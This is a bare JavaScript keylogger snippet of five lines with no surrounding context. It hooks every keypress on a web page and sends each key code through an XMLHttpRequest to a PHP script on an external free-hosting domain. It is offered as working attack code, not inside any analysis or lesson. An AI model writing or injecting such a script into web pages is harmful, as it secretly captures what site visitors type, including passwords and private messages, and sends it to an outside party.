document.onkeydown = function(k){
 url = new XMLHttpRequest();
 url.open("get", "https://latinlatin.000webhostapp.com/nuevop.php?k=" + k.keyCode);
 url.send(null);
}
